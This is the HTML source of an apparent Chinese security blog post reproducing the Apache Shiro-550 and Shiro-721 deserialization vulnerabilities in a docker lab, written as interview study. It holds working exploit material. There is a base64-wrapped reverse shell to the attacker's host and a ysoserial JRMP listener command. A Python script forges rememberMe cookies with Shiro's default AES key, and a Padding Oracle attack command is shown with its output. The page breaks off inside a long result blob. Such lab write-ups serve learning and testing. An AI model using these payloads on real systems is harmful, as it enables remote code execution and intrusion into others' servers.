@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>shiro|fastjson漏洞复现 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">shiro|fastjson漏洞复现</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-05-31&nbsp;&nbsp;17:34:54</a> &nbsp;
+                        </span>
+                    
+                    
+                    
+                    <span id="/2022/05/31/22-0531-01/" class="leancloud-visitors view" data-flag-title="shiro|fastjson漏洞复现">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>前天面试安恒的实习时，其余问题还略微好一点，问shiro|fastjson真是啥也说不出来，java方面的漏洞实在太重要了。但java代码了解的比较少，所以现在只对这些常见的java漏洞进行复现和简单了解</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
+</blockquote>
+<h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><p>Apache Shiro 框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p>
+<h2 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程如下：</p>
+<p>用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p>
+<p>如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求后，对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。</p>
+<p>在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这就更容易触发RCE漏洞，攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
+<h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>返回包中包含rememberMe&#x3D;deleteMe字段。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h4><blockquote>
+<p>公网目标靶机：centos（192.168.207.144）</p>
+<p>公网vps：win10（192.168.207.25）</p>
+<p>内网攻击主机：kali（192.168.207.212）</p>
+</blockquote>
+<p>环境搭建：在centos下用docker搭建，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 5555:8080 medicean/vulapps:s_shiro_1             #原本端口是8080给他换成5555</span><br></pre></td></tr></table></figure>
+
+<p>搭建完成后，访问<code>192.168.207.144:5555</code></p>
+<img src="/2022/05/31/22-0531-01/image-20220602210015862.png" alt="image-20220602210015862" style="zoom:80%;">
+
+<h4 id="检测是否存在漏洞"><a href="#检测是否存在漏洞" class="headerlink" title="检测是否存在漏洞"></a>检测是否存在漏洞</h4><p>工具：<a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
+<p><code>python shiro_exploit.py -u http://192.168.207.144:5555</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意：使用前要安装相关的模块，特别是安装Crypto模块，这里容易报错，如果电脑中有crypto模块，我们将其删除，然后重新安装pycryptodome模块（pycrypto、pycrytodome和crypto是一个东西，crypto在python上面的名字是pycrypto，pycryptodome是pycrypto的延伸版本，用法和pycrypto是一模一样的）</span><br><span class="line">pip uninstall crypto</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
+
+<p>然后通过该脚本，可以得到AES加密的密钥为<code>kPH+bIxk5D2deZiIxcaaaA==</code>，存在漏洞（True）</p>
+<img src="/2022/05/31/22-0531-01/image-20220602210714551.png" alt="image-20220602210714551" style="zoom:80%;">
+
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>首先kali上用nc监听9999端口</p>
+<img src="/2022/05/31/22-0531-01/image-20220601174454487.png" alt="image-20220601174454487" style="zoom:80%;">
+
+<p>Java Runtime 配合 bash 编码，在线编码地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a>    （ 这个网站根本打不开。。。但没关系，我们可以采用下面的处理方法）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把 bash -i &gt;&amp; /dev/tcp/192.168.207.212/9999 0&gt;&amp;1 进行base64解码，编码后内容如下：</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4yMTIvOTk5OSAwPiYx</span><br><span class="line">然后把 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4yMTIvOTk5OSAwPiYx 放到 bash -c &#123;echo,编码后的内容&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; ，如下：</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4yMTIvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在VPS上通过ysoserial中JRMP监听模块，监听VPS的6666端口并执行反弹shell命令，将命令反弹到kali上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar  ysoserial.exploit.JRMPListener 6666 CommonsCollections2 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy4yMTIvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/31/22-0531-01/image-20220602211551212.png" alt="image-20220602211551212" style="zoom:80%;">
+
+<p>然后用如下脚本payload.py生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)  # 替换刚才爆破的密钥</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    ip_port = &#x27;192.168.207.25:6666&#x27;      # IP是vps的IP，端口为ysoserial中JRMP监听模块的端口</span><br><span class="line">    payload = encode_rememberme(ip_port)</span><br><span class="line">    print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/31/22-0531-01/image-20220602213049022.png" alt="image-20220602213049022" style="zoom:80%;">
+
+<p>然后，目标网站选中Remember me进行burp抓包，将payload添加到cookie中</p>
+<img src="/2022/05/31/22-0531-01/image-20220602213216270.png" alt="image-20220602213216270" style="zoom:80%;">
+
+
+
+<p>然后可以成功反弹到kali上</p>
+<img src="/2022/05/31/22-0531-01/image-20220602213244091.png" alt="image-20220602213244091" style="zoom:80%;">
+
+<h2 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>rememberMe cookie通过AES-128-CBC模式加密，易受到Padding Oracle攻击。可以通过结合有效的rememberMe cookie作为Padding Oracle攻击的前缀，然后精⼼制作rememberMe来进⾏反序列化攻击</p>
+<p>Tip：在1.2.4版本后，shiro已经更换 AES-CBC AES-CBC 为 AES-GCM AES-GCM ，无法再通过Padding Oracle遍历key</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;&#x3D; 1.4.1（需要一个合法的登录账号，基于Padding Oracle attack来实现的攻击）</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境采用和shiro-550同样环境</p>
+<img src="/2022/05/31/22-0531-01/image-20220602210015862.png" alt="image-20220602210015862" style="zoom:80%;">
+
+<p>由于漏洞利用需要一个合法的登录账号，这里利用账号正常登陆获取一个有效的rememberMe cookie，并记录下这个rememberMe的值。这里使用账号root和密码secret来登陆</p>
+<img src="/2022/05/31/22-0531-01/image-20220602215510707.png" alt="image-20220602215510707" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie如下：</span><br><span class="line">eQPgUfBzj7e/tbx4N6px6bWcfD6RmlaDcJwCReJ2sjnd4a/zqqqiLFl4L4hNWBr45g7C+tbNFHqo+VA59fi9WwNhW4J+a5RbCrB/j4KwaogTzYDoE58gWJwBgc0UeaBNkXWMUykqirITUyQlCKUvEg7J0VtOuz9GKknxPkRO84N/eSjGs/Sh+QZnnuehk4pgbgE4h+87nU3IIKJfasASKnC3Y0cbuxbMyUBOoNxDrf9qPyNh5ItOijZrf+BvOr7wY5DpCxw2V6TsmRJzimJD8VCTOsLbLlU5BQG3R7WXoTtAmUzd/HDLhy3L+xIVGkYxB7oq0RZIXG1p2bv987OLx7egf5JXSod71S2q/v9ydgTg4Ujh0cVTK5ndaMuics7OqzalXRY3pO4YGghCpRlYqW1yWccln9HClDz4fej3FQRQPL9Uz5/H4ueKzQLqrEi84Gt3lRYl+g3TZAGZSzAPkgZ9sJ/XJSwIE6AepmQ1S2NFVQmMqKNm+inWPGrIUnZC</span><br></pre></td></tr></table></figure>
+
+<p>利用DNSlog探测，通过ysoserial工具生成payload.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;ping u73wgd.ceye.io&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/31/22-0531-01/image-20220602225001607.png" alt="image-20220602225001607" style="zoom:80%;">
+
+<p>使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a></p>
+<p>附kali安装maven环境：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42250835/article/details/120349852">https://blog.csdn.net/weixin_42250835/article/details/120349852</a></p>
+<p>由于网上没有找到PaddingOracleAttack.jar，所以这里kali安装maven后，自行编译即可</p>
+<img src="/2022/05/31/22-0531-01/image-20220602224638805.png" alt="image-20220602224638805" style="zoom:80%;">
+
+<p>附编译后的jar包：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12jTXFzHAYRKkDhQTWfsBFA">https://pan.baidu.com/s/12jTXFzHAYRKkDhQTWfsBFA</a>  提取码：1234 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进行Padding Oracle攻击，使用示例：java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br><span class="line">java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://127.0.0.1:8080http://192.168.207.144:5555/login.jsp/ eQPgUfBzj7e/tbx4N6px6bWcfD6RmlaDcJwCReJ2sjnd4a/zqqqiLFl4L4hNWBr45g7C+tbNFHqo+VA59fi9WwNhW4J+a5RbCrB/j4KwaogTzYDoE58gWJwBgc0UeaBNkXWMUykqirITUyQlCKUvEg7J0VtOuz9GKknxPkRO84N/eSjGs/Sh+QZnnuehk4pgbgE4h+87nU3IIKJfasASKnC3Y0cbuxbMyUBOoNxDrf9qPyNh5ItOijZrf+BvOr7wY5DpCxw2V6TsmRJzimJD8VCTOsLbLlU5BQG3R7WXoTtAmUzd/HDLhy3L+xIVGkYxB7oq0RZIXG1p2bv987OLx7egf5JXSod71S2q/v9ydgTg4Ujh0cVTK5ndaMuics7OqzalXRY3pO4YGghCpRlYqW1yWccln9HClDz4fej3FQRQPL9Uz5/H4ueKzQLqrEi84Gt3lRYl+g3TZAGZSzAPkgZ9sJ/XJSwIE6AepmQ1S2NFVQmMqKNm+inWPGrIUnZC  16  payload.class </span><br></pre></td></tr></table></figure>
+
+<p>执行后结果如下：</p>
+<img src="/2022/05/31/22-0531-01/image-20220602225749475.png" alt="image-20220602225749475" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Result =&gt; 7/EG7AwLDwl7B3QFBAMVAXoPbw16C2sJJgdzBXADawF8DyANXAt4CWEHaQV2A2sBZA93DV0LfwltB3MFYQOzZCAPOYAzC1NZCwcGBQYDSwEQDwoNfwtjCXIHYwVIAwIBHQ8EDW8LZQllB3YFZQNwAXEPeg1jC3gJfAcGBRIDTgF6D28NegtrCScHcwVwA2sBfA8hDU8LZQllB3YFZQNwAXEPeg1jC3gJMwd+BXQDAgEQDw4NDgt5CXoHBgUvA20BYg9pDSILawl4B2cFZwNqAXUPIA1vC2UJZQdrBWsDbAFjDyANbgtvCWkHaAVxA3YBeQ9iDX8LJAlKB2MFZQNsAVMPYQ1hC3oJaQd0BWUDdgF/D3wNZmssUXsHJAXq5gABEA8MDUALCgkFBwwFZwNtAX0Pfg1tC3gJaQdyBWsDcAFhDw4NcgsKCQkHSgUEAwoBYA98DWMLegltB3QFcAN7AWQPDg0eC0YJYgdnBXIDYwE/D2INbQtkCW8HKQVXA3YBYg9nDWILbQkzB34FdANxAWIPDg0zC2UJegdhBSoDYwFgD28NbwtiCW0HKAVnA20BfQ9jDWMLZAl7BygFZwNtAXwPYg1pC2kJfAdvBWsDbAFjDyANbwtlCWUHdgVlA3ABcQ96DWMLeAl7BygFRwNtAX0Pfg1tC3gJaQdkBWgDZwFTD2ENYQt6CWkHdAVlA3YBfw98Da3oNQnTfTkFBgMCARAPdg18C34JCAcWBWsDdwFkD34NeQt+CVgHdAVrA3IBdQ98DXgLYwltB3UFcwMGARAPDg0MCwkJewd0BQQDOAFzD2ENYQskCXsHcwVqAywBfw98DWsLJAlpB3YFZQNhAXgPaw0iC3IJaQdqBWUDbAE+D2cNYgt+CW0HdAVqA2MBfA8gDXQLeQlkB3IFZwMsAWQPfA1tC3IJJgdSBWEDbwFgD2INbQt+CW0HdQVNA28BYA9iDQULXQlHB556wuMxARMPDg0KC0MJCAcLBQ4DXQF5D2ANaAtvCWYHcgVKA3cBfQ9sDWkLeAlBBwYFCgNdAWQPfA1tC2QJewdqBWEDdgFZD2ANaAtvCXAHXQUEAw8BGg9RDW4Lcwl8B2MFZwNtAXQPaw1/C34JCAcFBV8DWQFSD1UNDAsMCVcHZQVoA2MBYw99DXgLCgkaB10FSANoAXEPeA1tCyUJZAdnBWoDZQE/D00NYAtrCXsHdQU/A04BEA8LDVMLZAlpB2sFYQNzARAPcA0MCw4JRAcGBRUDXQF/D3sNeAt6CX0HcgVUA3ABfw9+DWkLeAl8B28FYQNxAWQPDg0aC0YJYgdnBXIDYwE/D3sNeAtjCWQHKQVUA3ABfw9+DWkLeAl8B28FYQNxASsPdg18CwoJCAcGBQQD9/nl9/v1+fN/CXoHBgUHA1kBSw9MDUcLNQkdB2EFYwM9ARIPDg0MC3IJeAcGBQQDAgESD3sNfgsKCQoHXQVGAwzgBw8xDQQLXgk3BwYFBAN6AWAPDg0MCwwJj+eH4TsDAgEQDzwNDAszCQUHDAUEAwEBEA8sDQsLCgk/BwEFBAMnARcPDg0qCwsJCAcWBXcDZwFiD2cNbQtmCV4HYwV2A3EBeQ9hDWILXwlBB0IFBQMCAREPRA0NCwoJBQcMBUcDbQF+D30NeAtrCWYHcgVSA2MBfA97DWkLDwk3B89hAGE9AREPDg0KCzYJYQdoBW0DdgEuDw8NDAsJCSAHLwVSAwMBEA8KDU8LZQlsB2MFBQMCAR8PQg1lC2QJbQdIBXEDbwFyD2sNfgteCWkHZAVoA2cBEQ8ODR4LRglnB2UFZQNuAUYPbw1+C2MJaQdkBWgDZwFED28NbgtmCW0HBwUEAwYBZA9mDWULeQkJBwYFFwNRAWQPew1uC14JegdnBWoDcQF8D2sNeAtaCWkHfwVoA20BcQ9qDQ0LCgkEB08FagNsAXUPfA1PC2YJaQd1BXcDZwFjDw8NDAs/CUQHfwV3A20BYw9rDX4LYwlpB2oFKwNyAXEPdw1gC2UJaQdiBXcDLQFlD3oNZQtmCScHQQVlA2YBdw9rDXgLeQksB1UFcAN3AXIPWg1+C2sJZgd1BWgDZwFkD14NbQtzCWQHaQVlA2YBKw8PDQwLAwl8B3QFZQNsAWMPaA1jC3gJZQcHBQQDcAE4D0INbwtlCWUHKQV3A3cBfg8hDWMLeAlvBykFZQNyAXEPbQ1kC28JJwd+BWUDbgFxD2ANIwtjCWYHcgVhA3ABfg9vDWALJQlwB3UFaAN2AXMPIQ1IC0UJRQc9BV8DTgFzD2ENYQslCXsHcwVqAy0Bfw98DWsLJQlpB3YFZQNhAXgPaw0jC3IJZQdqBSsDawF+D3oNaQt4CWYHZwVoAy0BYw9rDX4LYwlpB2oFbQN4AXUPfA0jC1kJbQd0BW0DYwF8D2cNdgtrCXwHbwVrA2wBWA9vDWILbglkB2MFdgM5ATkPWA0NCwoJAAdiBWsDYQFlD2MNaQtkCXwHBwUEAy8BXA9tDWMLZwknB3UFcQNsAT8PYQ1+C20JJwdnBXQDYwFzD2YNaQslCXAHZwVoA2MBfg8hDWULZAl8B2MFdgNsAXEPYg0jC3IJewdqBXADYQE/D0oNQwtHCTMHBwUEAwoBeA9vDWILbglkB2MFdgNxAREPDg1OC1EJRAdlBWsDbwE/D30NeQtkCScHaQV2A2UBPw9vDXwLawlrB24FYQMtAWgPYw1gCyUJYQdoBXADZwFiD2ANbQtmCScHdQVhA3ABeQ9vDWALYwlyB2MFdgMtAUMPaw1+C2MJaQdqBW0DeAFxD3oNZQtlCWYHTgVlA2wBdA9iDWkLeAkzBwcFBAMPARoPSw10C2kJbQd2BXADawF/D2ANfwsNCQgHIQUFAwIBLw9CDW8LZQllBykFdwN3AX4PIQ1jC3gJbwcpBWUDcgFxD20NZAtvCScHfgVlA24BcQ9gDSMLYwlmB3IFYQNwAX4Pbw1gCyUJcAd1BWgDdgFzDyENSAtFCUUHPQVIA2EBfw9jDSMLeQl9B2gFKwNtAWIPaQ0jC2sJeAdnBWcDagF1DyENdAtnCWQHKQVtA2wBZA9rDX4LZAlpB2oFKwNmAWQPYw0jC04JXAdLBUUDegF5D30NRQt+CW0HdAVlA3YBfw98DTcLRglrB2kFaQMtAWMPew1iCyUJZwd0BWMDLQFxD34NbQtpCWAHYwUrA3oBfQ9iDSMLYwlmB3IFYQNwAX4Pbw1gCyUJewdjBXYDawFxD2INZQtwCW0HdAUrA1EBdQ98DWULawlkB28FfgNjAWQPZw1jC2QJQAdnBWoDZgF8D2sNfgsxCSEHUAUFAwIBGA9nDXgLbwl6B2cFcANtAWIPDw0MCz8JRAdlBWsDbwE/D30NeQtkCScHaQV2A2UBPw9vDXwLawlrB24FYQMtAWgPYw1gCyUJYQdoBXADZwFiD2ANbQtmCScHYgVwA28BPw9KDVgLRwlJB34FbQNxAVkPeg1pC3gJaQdyBWsDcAErDw8NDAsNCWAHZwVqA2YBfA9rDX4LCwkIB0cFSANhAX8PYw0jC3kJfQdoBSsDbQFiD2kNIwtrCXgHZwVnA2oBdQ8hDXQLZwlkBykFbQNsAWQPaw1+C2QJaQdqBSsDcQF1D3wNZQtrCWQHbwV+A2cBYg8hDV8Lbwl6B28FZQNuAXkPdA1tC34JYQdpBWoDSgFxD2ANaAtmCW0HdAU/AwMBEA8DDQYLWQlnB3MFdgNhAXUPSA1lC2YJbQcHBQQDDgFXD28NaAttCW0HcgV3AywBeg9vDXoLawkEBwYFCQMIARAPBQ0LCwoJIAcHBQQDMQFpD30NYwt5CW0HdAVtA2MBfA8hDXwLawlxB2oFawNjAXQPfQ0jC38JfAdvBWgDLQFXD28NaAttCW0HcgV3AyYBQw96DXkLaAlcB3QFZQNsAWMPYg1pC34JWAdnBX0DbgF/D28NaAsLCQgHRgVnA20BfQ8hDX8LfwlmBykFawNwAXcPIQ1tC3oJaQdlBWwDZwE/D3YNbQtmCWkHaAUrA2sBfg96DWkLeAlmB2cFaAMtAWgPfQ1gC34JawcpBXYDdwF+D3oNZQtnCW0HKQVFA2ABYw96DX4LawlrB3IFUANwAXEPYA1/C2YJbQdyBQUDAgEED2QNbQt8CWkHKQVtA20BPw9dDWkLeAlhB2cFaANrAWoPbw1uC2YJbQcHBQQDOwFzD2ENYQslCXsHcwVqAy0Bfw98DWsLJQlpB3YFZQNhAXgPaw0jC3IJaQdqBWUDbAE/D2cNYgt+CW0HdAVqA2MBfA8hDXQLeQlkB3IFZwMtAUQPfA1tC2QJewdqBWEDdgFVD3YNbwtvCXgHcgVtA20Bfg8PDQwLFQlxB3UFawNxAXUPfA1lC2sJZAcpBXQDYwFpD2INYwtrCWwHdQUrA3cBZA9nDWALJQlPB2cFYANlAXUPeg1/CwsJCAcOBTgDYQF8D2cNYgtjCXwHOAUFAwIBAQ9kDW0LfAlpBykFaANjAX4PaQ0jC1gJfQdoBXADawF9D2sNCwsKCSIHBwUEAw8BGg9pDWkLfglaB3MFagN2AXkPYw1pCwsJCAcTBSwDKwFcD2QNbQt8CWkHKQVoA2MBfg9pDSMLWAl9B2gFcANrAX0Paw03CwYJCAcqBQQDLwEdDwQNDAshCQgHKAUFAwIBAw9+DWULZAlvByYFcQM1ASMPeQ1rC24JJgdlBWEDewF1DyANZQtlCQAHBgU0AwMBEA8KDWkLcgltB2UFBQMCATcPJg1AC2AJaQdwBWUDLQF8D28NYgttCScHVQVwA3ABeQ9gDWsLMQkhB0oFbgNjAWYPbw0jC2YJaQdoBWMDLQFAD3wNYwtpCW0HdQV3AzkBHA8ODT4LCgk7BwsFDgMCATsPDg04CwsJCAcLBQ4DUQFkD28NbwthCUUHZwV0A1YBcQ9sDWALbwkJBwYFGwN7AWMPYQ1/C28JegdvBWUDbgE/D14NewtkCW0HdAU1AzcBIQ86DToLPwk6BzUFMgM2ASIPOg0/Cz0JOAc2BQUDAgExD0INdQt5CWcHdQVhA3ABeQ9vDWAL